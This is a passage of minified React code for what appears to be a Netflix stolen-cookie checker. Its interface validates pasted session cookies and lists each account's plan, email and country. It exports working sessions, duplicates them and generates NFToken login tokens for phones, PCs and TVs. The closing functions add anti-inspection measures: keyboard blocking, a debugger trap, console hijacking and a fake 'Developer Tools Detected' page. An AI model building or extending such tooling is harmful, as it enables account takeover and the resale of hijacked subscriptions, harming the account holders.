              onClick: Ni,
              className: "col-span-2 sm:col-span-1 flex items-center justify-center gap-2 px-5 py-3 rounded-xl bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 font-semibold text-sm hover:bg-emerald-500/25 transition-all",
              children: [g.jsx(lr, {
                size: 15
              }), "Resume (", We.current.length, ")"]
            })]
          }), g.jsx("div", {
            className: "border-t border-zinc-800/60"
          }), g.jsxs("div", {
            className: "grid grid-cols-2 sm:flex sm:flex-wrap gap-2",
            children: [g.jsxs("button", {
              onClick: sl,
              disabled: tt || Bl === 0,
              className: "flex items-center justify-center gap-1.5 px-3 py-2.5 rounded-xl border border-zinc-700 bg-zinc-800/40 text-zinc-400 text-xs font-medium hover:bg-zinc-800 hover:text-zinc-200 transition-all disabled:opacity-40 disabled:cursor-not-allowed",
              children: [g.jsx(ar, {
                size: 12
              }), "Retry Failed (", Bl, ")"]
            }), g.jsxs("button", {
              onClick: ie,
              disabled: tt || $t.errors === 0,
              className: "flex items-center justify-center gap-1.5 px-3 py-2.5 rounded-xl border border-zinc-700 bg-zinc-800/40 text-zinc-400 text-xs font-medium hover:bg-zinc-800 hover:text-zinc-200 transition-all disabled:opacity-40 disabled:cursor-not-allowed",
              children: [g.jsx(ar, {
                size: 12
              }), "Retry Errors (", $t.errors, ")"]
            }), g.jsxs("button", {
              onClick: ge,
              disabled: $t.working === 0,
              className: "flex items-center justify-center gap-1.5 px-3 py-2.5 rounded-xl border border-zinc-700 bg-zinc-800/40 text-zinc-400 text-xs font-medium hover:bg-zinc-800 hover:text-zinc-200 transition-all disabled:opacity-40 disabled:cursor-not-allowed",
              children: [g.jsx(tr, {
                size: 12
              }), "Export Valid (", $t.working, ")"]
            }), g.jsxs("button", {
              onClick: ql,
              disabled: Ti === 0,
              className: "flex items-center justify-center gap-1.5 px-3 py-2.5 rounded-xl border border-zinc-700 bg-zinc-800/40 text-zinc-400 text-xs font-medium hover:bg-zinc-800 hover:text-zinc-200 transition-all disabled:opacity-40 disabled:cursor-not-allowed",
              children: [g.jsx(tr, {
                size: 12
              }), "Premium (", Ti, ")"]
            }), g.jsxs("button", {
              onClick: Tn,
              disabled: !D.some(d => d.status === "working" && d.nftoken),
              className: "flex items-center justify-center gap-1.5 px-3 py-2.5 rounded-xl border border-zinc-700 bg-zinc-800/40 text-zinc-400 text-xs font-medium hover:bg-zinc-800 hover:text-zinc-200 transition-all disabled:opacity-40 disabled:cursor-not-allowed",
              children: [g.jsx(tr, {
                size: 12
              }), "NFTokens"]
            })]
          }), g.jsx("div", {
            className: "border-t border-zinc-800/60"
          }), g.jsxs("div", {
            className: "flex flex-col sm:flex-row gap-3 sm:items-center",
            children: [g.jsxs("div", {
              className: "flex items-center gap-0 rounded-xl border border-zinc-700 overflow-hidden bg-zinc-800/30",
              children: [g.jsx("span", {
                className: "px-3 py-2.5 text-[11px] text-zinc-600 uppercase tracking-wide border-r border-zinc-700 whitespace-nowrap bg-zinc-800/40",
                children: "Copies"
              }), g.jsx("input", {
                type: "text",
                inputMode: "numeric",
                pattern: "[0-9]*",
                value: J,
                onFocus: d => d.target.select(),
                onChange: d => {
                  const U = d.target.value.replace(/[^0-9]/g, "");
                  lt(U);
                  const H = parseInt(U, 10);
                  !isNaN(H) && H >= 1 && B(Math.min(20, H))
                }
                ,
                onBlur: () => {
                  const d = parseInt(J, 10)
                    , U = isNaN(d) || d < 1 ? 1 : Math.min(20, d);
                  B(U),
                    lt(String(U))
                }
                ,
                className: "w-14 bg-transparent text-emerald-400 text-center text-sm font-mono py-2.5 px-2 outline-none border-r border-zinc-700"
              }), g.jsxs("button", {
                onClick: Ha,
                disabled: V || tt || $t.working === 0,
                className: "flex items-center gap-1.5 px-3 py-2.5 text-xs font-medium text-cyan-400 hover:text-cyan-300 hover:bg-cyan-500/10 transition-colors disabled:text-zinc-700 disabled:cursor-not-allowed whitespace-nowrap",
                children: [V ? g.jsx(er, {
                  size: 12,
                  className: "animate-spin"
                }) : g.jsx(Cu, {
                  size: 12
                }), V ? "Multiplying…" : "Multiply Valid"]
              })]
            }), g.jsxs("div", {
              className: "flex flex-wrap items-center gap-x-4 gap-y-2 sm:gap-x-5 sm:ml-auto",
              children: [
                g.jsx(S0, {
                  checked: cacheEnabled,
                  onChange: setCacheEnabled,
                  label: "⚡ Cache"
                }),
                g.jsx(S0, {
                  checked: Rt,
                  onChange: re,
                  label: "Filter Dupes"
                }), g.jsx(S0, {
                  checked: Tt,
                  onChange: Gt,
                  label: "NFToken Gen"
                }), Tt && g.jsxs("div", {
                className: "flex items-center gap-1.5 w-full sm:w-auto",
                children: [g.jsx("div", {
                  className: "flex items-center gap-0.5 bg-zinc-800/70 border border-zinc-700/50 rounded-lg p-0.5",
                  children: [["mobile", "📱", "Mobile"], ["pc", "🖥️", "PC"], ["tv", "📺", "TV"]].map(([d, U, H]) => g.jsxs("button", {
                    type: "button",
                    onClick: () => zi(d),
                    className: ye("flex items-center gap-1 px-2 py-1 rounded-md text-[10px] font-medium transition-colors", Zt === d ? "bg-zinc-600 text-zinc-100" : "text-zinc-500 hover:text-zinc-300 hover:bg-zinc-700/50"),
                    title: `Generate NFToken for ${H}`,
                    children: [g.jsx("span", {
                      children: U
                    }), g.jsx("span", {
                      children: H
                    })]
                  }, d))
                }), g.jsxs("button", {
                  type: "button",
                  onClick: Sn,
                  disabled: _t || tt || D.filter(d => d.pair.netflixId && !d.pair.netflixId.startsWith("__nftoken__") && d.status !== "duplicate").length === 0,
                  className: "flex items-center gap-1 px-2 py-1.5 rounded-lg text-[10px] font-medium text-cyan-400 hover:text-cyan-300 hover:bg-cyan-500/10 border border-cyan-500/20 hover:border-cyan-500/40 transition-colors disabled:text-zinc-600 disabled:border-zinc-700/30 disabled:cursor-not-allowed",
                  title: "Regenerate all NFTokens fresh",
                  children: [g.jsx(ar, {
                    size: 10,
                    className: _t ? "animate-spin" : ""
                  }), _t ? "Regen…" : "Regen"]
                })]
              })]
            })]
          })]
        }), g.jsxs("div", {
          className: "hidden lg:grid grid-cols-6 gap-3",
          children: [g.jsx(xi, {
            label: "Total",
            value: $t.total,
            icon: Sh
          }), g.jsx(xi, {
            label: "Valid",
            value: $t.working,
            color: "text-emerald-400",
            icon: Du,
            glow: !0
          }), g.jsx(xi, {
            label: "Duplicates",
            value: $t.duplicates,
            color: "text-amber-400",
            icon: Eh
          }), g.jsx(xi, {
            label: "Expired",
            value: $t.expired,
            color: "text-red-400",
            icon: Mh
          }), g.jsx(xi, {
            label: "Cached",
            value: $t.cached,
            color: "text-amber-300",
            icon: Zh_zap
          }), g.jsx(xi, {
            label: "Errors",
            value: $t.errors,
            color: "text-zinc-500",
            icon: Lh
          })]
        }), g.jsxs("div", {
          className: "flex-1 rounded-2xl border border-zinc-800 bg-[#0d0d0d] overflow-hidden flex flex-col min-h-[360px]",
          children: [g.jsxs("div", {
            className: "flex items-center justify-between px-4 py-2.5 border-b border-zinc-800 bg-[#0a0a0a] gap-2 flex-wrap",
            children: [g.jsx("span", {
              className: "text-xs font-medium text-zinc-400 font-mono tracking-wide",
              children: "Results"
            }), g.jsxs("div", {
              className: "flex items-center gap-1.5 bg-zinc-900/80 p-1 rounded-xl border border-zinc-800",
              children: [g.jsx("button", {
                type: "button",
                onClick: () => setPlanFilter("all"),
                className: ye("px-3 py-1 rounded-lg text-[11px] font-semibold tracking-wider uppercase transition-all", planFilter === "all" ? "bg-zinc-800 text-white shadow-sm border border-zinc-700" : "text-zinc-500 hover:text-zinc-300"),
                children: "ALL"
              }), g.jsxs("button", {
                type: "button",
                onClick: () => setPlanFilter("premium"),
                className: ye("px-3 py-1 rounded-lg text-[11px] font-semibold tracking-wider uppercase transition-all flex items-center gap-1.5", planFilter === "premium" ? "bg-amber-500/20 text-amber-300 border border-amber-500/40 shadow-sm" : "text-zinc-500 hover:text-amber-400"),
                children: ["PREMIUM", Ti > 0 ? g.jsx("span", {
                  className: "text-[10px] px-1.5 py-0.2 rounded-full bg-amber-500/20 text-amber-300 font-mono",
                  children: Ti
                }) : null]
              }), g.jsxs("button", {
                type: "button",
                onClick: () => setPlanFilter("standard"),
                className: ye("px-3 py-1 rounded-lg text-[11px] font-semibold tracking-wider uppercase transition-all flex items-center gap-1.5", planFilter === "standard" ? "bg-blue-500/20 text-blue-300 border border-blue-500/40 shadow-sm" : "text-zinc-500 hover:text-blue-400"),
                children: ["STANDARD", stdCount > 0 ? g.jsx("span", {
                  className: "text-[10px] px-1.5 py-0.2 rounded-full bg-blue-500/20 text-blue-300 font-mono",
                  children: stdCount
                }) : null]
              }), g.jsxs("button", {
                type: "button",
                onClick: () => setPlanFilter("basic"),
                className: ye("px-3 py-1 rounded-lg text-[11px] font-semibold tracking-wider uppercase transition-all flex items-center gap-1.5", planFilter === "basic" ? "bg-purple-500/20 text-purple-300 border border-purple-500/40 shadow-sm" : "text-zinc-500 hover:text-purple-400"),
                children: ["BASIC", basicCount > 0 ? g.jsx("span", {
                  className: "text-[10px] px-1.5 py-0.2 rounded-full bg-purple-500/20 text-purple-300 font-mono",
                  children: basicCount
                }) : null]
              }), g.jsxs("button", {
                type: "button",
                onClick: () => setPlanFilter("ph"),
                className: ye("px-3 py-1 rounded-lg text-[11px] font-semibold tracking-wider uppercase transition-all flex items-center gap-1.5", planFilter === "ph" ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 shadow-sm" : "text-zinc-500 hover:text-emerald-400"),
                children: ["🇵🇭 PH", phCount > 0 ? g.jsx("span", {
                  className: "text-[10px] px-1.5 py-0.2 rounded-full bg-emerald-500/20 text-emerald-300 font-mono",
                  children: phCount
                }) : null]
              }), g.jsxs("button", {
                type: "button",
                onClick: () => setPlanFilter("cached"),
                className: ye("px-3 py-1 rounded-lg text-[11px] font-semibold tracking-wider uppercase transition-all flex items-center gap-1.5", planFilter === "cached" ? "bg-amber-400/20 text-amber-300 border border-amber-400/40 shadow-sm" : "text-zinc-500 hover:text-amber-300"),
                children: ["⚡ CACHED", $t.cached > 0 ? g.jsx("span", {
                  className: "text-[10px] px-1.5 py-0.2 rounded-full bg-amber-400/20 text-amber-300 font-mono",
                  children: $t.cached
                }) : null]
              })]
            }), g.jsxs("span", {
              className: "text-xs font-mono text-zinc-600",
              children: [ha.length, " / ", Dt.total || D.length]
            })]
          }), g.jsx("div", {
            className: "h-0.5 bg-zinc-800 relative",
            children: g.jsx("div", {
              className: "absolute inset-y-0 left-0 bg-emerald-500 transition-all duration-300",
              style: {
                width: `${Dt.total > 0 ? Dt.current / Dt.total * 100 : 0}%`
              }
            })
          }), D.length === 0 ? g.jsxs("div", {
            className: "flex-1 flex flex-col items-center justify-center gap-3 p-8 text-center",
            children: [g.jsx("div", {
              className: "w-12 h-12 rounded-2xl bg-zinc-800/50 flex items-center justify-center",
              children: g.jsx(o0, {
                size: 20,
                className: "text-zinc-600"
              })
            }), g.jsx("p", {
              className: "text-sm text-zinc-500 font-medium",
              children: "No results yet"
            }), g.jsx("p", {
              className: "text-xs text-zinc-700 max-w-xs leading-relaxed",
              children: "Paste your Netflix cookies in the input panel and click Start Check to begin validation."
            })]
          }) : g.jsxs("div", {
            className: "overflow-auto flex-1",
            children: [g.jsxs("table", {
              className: "w-full text-left text-xs",
              children: [g.jsx("thead", {
                className: "bg-[#0a0a0a] sticky top-0 z-10",
                children: g.jsx("tr", {
                  children: ["#", "Status", "Plan", "Email", "Country", "Log", "Copy", ...Tt ? ["NFToken"] : []].map(d => g.jsx("th", {
                    className: "px-3 py-3 text-[10px] font-semibold text-zinc-600 uppercase tracking-widest border-b border-zinc-800 whitespace-nowrap",
                    children: d
                  }, d))
                })
              }), g.jsx("tbody", {
                children: Yl.map((d, U) => g.jsxs("tr", {
                  className: ye("border-b border-zinc-800/40 hover:bg-zinc-800/20 transition-colors", U % 2 === 0 ? "bg-transparent" : "bg-zinc-900/10"),
                  children: [g.jsx("td", {
                    className: "px-3 py-2.5 text-zinc-600 font-mono",
                    children: d.id.toString().padStart(3, "0")
                  }), g.jsx("td", {
                    className: "px-3 py-2.5",
                    children: g.jsx(x0, {
                      status: d.status,
                      cached: d.cached,
                      cachedAt: d.cachedAt
                    })
                  }), g.jsxs("td", {
                    className: "px-3 py-2.5 text-zinc-300 font-medium whitespace-nowrap",
                    children: [d.plan, d.extraMembers ? g.jsxs("span", {
                      className: "ml-1.5 text-emerald-400 text-[10px]",
                      children: ["+", d.extraMembers]
                    }) : null]
                  }), g.jsx("td", {
                    className: "px-3 py-2.5 text-zinc-400 max-w-[180px] truncate",
                    title: d.email,
                    children: d.email
                  }), g.jsx("td", {
                    className: "px-3 py-2.5 text-zinc-500",
                    children: d.country
                  }), g.jsx("td", {
                    className: "px-3 py-2.5 max-w-[180px] truncate",
                    title: d.error || "",
                    children: d.error ? g.jsx("span", {
                      className: "text-red-400 text-[10px]",
                      children: d.error
                    }) : d.status === "expired" ? g.jsx("span", {
                      className: "text-red-400 text-[10px] font-medium",
                      children: "Session expired"
                    }) : d.status === "duplicate" ? g.jsx("span", {
                      className: "text-amber-500 text-[10px] font-medium",
                      children: "Duplicate"
                    }) : d.status === "working" ? g.jsx("span", {
                      className: "text-emerald-600 text-[10px] font-medium",
                      children: "OK"
                    }) : g.jsx("span", {
                      className: "text-zinc-600 text-[10px]",
                      children: "—"
                    })
                  }), g.jsx("td", {
                    className: "px-3 py-2.5",
                    children: g.jsx("button", {
                      onClick: () => Yu(d),
                      className: "p-1.5 rounded-lg text-zinc-600 hover:text-emerald-400 hover:bg-emerald-500/10 transition-colors",
                      children: je === d.id ? g.jsx(Du, {
                        size: 13,
                        className: "text-emerald-400"
                      }) : g.jsx(Cu, {
                        size: 13
                      })
                    })
                  }), Tt && g.jsx("td", {
                    className: "px-3 py-2.5 text-center",
                    children: d.nftoken && d.nftoken !== "__failed__" && d.nftoken !== "__pending__" ? g.jsx("button", {
                      onClick: () => Gu(d),
                      title: `Copy: ${cr(d.nftoken, Zt)}`,
                      className: "p-1.5 rounded-lg text-zinc-600 hover:text-cyan-400 hover:bg-cyan-500/10 transition-colors mx-auto",
                      children: T === d.id ? g.jsx(Du, {
                        size: 13,
                        className: "text-cyan-400"
                      }) : g.jsx(Cu, {
                        size: 13
                      })
                    }) : d.nftoken === "__pending__" ? g.jsx(er, {
                      size: 12,
                      className: "animate-spin text-cyan-400 mx-auto"
                    }) : d.status === "working" ? g.jsx("button", {
                      onClick: () => wa(d),
                      title: "Generate / Retry NFToken",
                      className: "px-2 py-1 rounded-md bg-cyan-500/10 text-cyan-400 hover:bg-cyan-500/20 text-[10px] font-medium transition-colors mx-auto",
                      children: d.nftoken === "__failed__" ? "Retry" : "Gen"
                    }) : g.jsx("span", {
                      className: "text-zinc-700 text-[10px]",
                      children: "—"
                    })
                  })]
                }, d.id))
              })]
            }), Gl && g.jsx("div", {
              className: "flex justify-center py-4 border-t border-zinc-800/40",
              children: g.jsxs("button", {
                onClick: () => yt(d => d + ir),
                className: "flex items-center gap-1.5 px-4 py-2 rounded-xl border border-zinc-700 bg-zinc-800/40 text-zinc-400 text-xs font-medium hover:bg-zinc-800 hover:text-zinc-200 transition-all",
                children: [g.jsx(Th, {
                  size: 13
                }), "Load more (", ha.length - W, " remaining)"]
              })
            })]
          })]
        })]
      })]
    })]
  })
}
const Xg = new Set(["F12", "F11"])
  , Qg = new Set(["i", "I", "j", "J", "c", "C", "k", "K", "l", "L", "u", "U", "s", "S"]);
function Lg() {
  try {
    window.stop()
  } catch { }
  const c = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/>
<title>Access Denied</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{
  background:#0a0a0a;
  color:#fff;
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  overflow:hidden;
}
.glow{
  position:fixed;
  width:600px;height:600px;
  border-radius:50%;
  background:radial-gradient(circle,rgba(229,9,20,0.2) 0%,transparent 70%);
  top:50%;left:50%;
  transform:translate(-50%,-50%);
  pointer-events:none;
  animation:pulse 3s ease-in-out infinite;
}
@keyframes pulse{
  0%,100%{opacity:.5;transform:translate(-50%,-50%) scale(1)}
  50%{opacity:1;transform:translate(-50%,-50%) scale(1.1)}
}
.lines{
  position:fixed;inset:0;
  background:repeating-linear-gradient(0deg,transparent,transparent 39px,rgba(255,255,255,.02) 40px);
  pointer-events:none;
}
.card{
  position:relative;z-index:1;
  background:linear-gradient(150deg,#1c1c1c,#111);
  border:1px solid rgba(229,9,20,0.2);
  border-radius:24px;
  padding:56px 60px;
  max-width:480px;width:90%;
  text-align:center;
  box-shadow:0 0 80px rgba(229,9,20,0.12),0 40px 100px rgba(0,0,0,0.7);
  animation:up .55s cubic-bezier(.22,1,.36,1) both;
}
@keyframes up{
  from{opacity:0;transform:translateY(32px)}
  to{opacity:1;transform:translateY(0)}
}
.shield{
  display:inline-flex;align-items:center;justify-content:center;
  width:76px;height:76px;border-radius:50%;
  background:rgba(229,9,20,0.1);
  border:1.5px solid rgba(229,9,20,0.4);
  margin-bottom:24px;
  animation:pop .6s .1s cubic-bezier(.34,1.56,.64,1) both;
}
@keyframes pop{
  from{opacity:0;transform:scale(.4)}
  to{opacity:1;transform:scale(1)}
}
.badge{
  display:inline-block;
  background:rgba(229,9,20,0.12);
  border:1px solid rgba(229,9,20,0.35);
  color:#e50914;
  font-size:10px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;
  padding:5px 14px;border-radius:999px;margin-bottom:22px;
}
h1{
  font-size:1.9rem;font-weight:800;letter-spacing:-.5px;
  line-height:1.2;margin-bottom:14px;
}
h1 em{color:#e50914;font-style:normal}
p{
  font-size:.9rem;color:rgba(255,255,255,.45);
  line-height:1.75;margin-bottom:28px;
}
hr{border:none;border-top:1px solid rgba(229,9,20,.15);margin-bottom:24px}
.tip{font-size:.78rem;color:rgba(255,255,255,.25);letter-spacing:.2px}
.tip b{color:rgba(229,9,20,.6);font-weight:600}
</style>
</head>
<body>
<div class="glow"></div>
<div class="lines"></div>
<div class="card">
  <div class="shield">
    <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#e50914" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
      <line x1="12" y1="8" x2="12" y2="12"/>
      <circle cx="12" cy="16" r=".5" fill="#e50914"/>
    </svg>
  </div>
  <div class="badge">⚠ Security Alert</div>
  <h1>Developer Tools<br/><em>Detected</em></h1>
  <p>Access has been suspended because browser developer tools were detected. This tool is protected against inspection and debugging.</p>
  <hr/>
  <p class="tip">Close DevTools and <b>refresh the page</b> to continue,<br/>or try using a different browser.</p>
</div>
</body>
</html>`;
  document.open(),
    document.write(c),
    document.close()
}
function Zg(c) {
  if (Xg.has(c.key)) {
    c.preventDefault(),
      c.stopImmediatePropagation();
    return
  }
  if ((c.ctrlKey || c.metaKey) && c.shiftKey && Qg.has(c.key)) {
    c.preventDefault(),
      c.stopImmediatePropagation();
    return
  }
  (c.ctrlKey || c.metaKey) && (c.key === "u" || c.key === "U") && (c.preventDefault(),
    c.stopImmediatePropagation())
}
function Vg(c) {
  c.preventDefault(),
    c.stopImmediatePropagation()
}
let z0 = null;
function Kg() {
  if (z0 !== null)
    return;
  const c = new Function("debugger");
  z0 = setInterval(() => {
    c()
  }
    , 50)
}
function Jg() {
  const c = ["log", "warn", "error", "info", "debug", "table", "clear"]
    , p = {
      ...console
    };
  for (const h of c)
    try {
      Object.defineProperty(console, h, {
        get() {
          return Lg(),
            p[h].bind(p)
        },
        configurable: !0
      })
    } catch { }
}
function $g() {
  // Anti-debugging disabled for clean local execution
}
// $g();
eh.createRoot(document.getElementById("root")).render(g.jsx(Gg, {}));

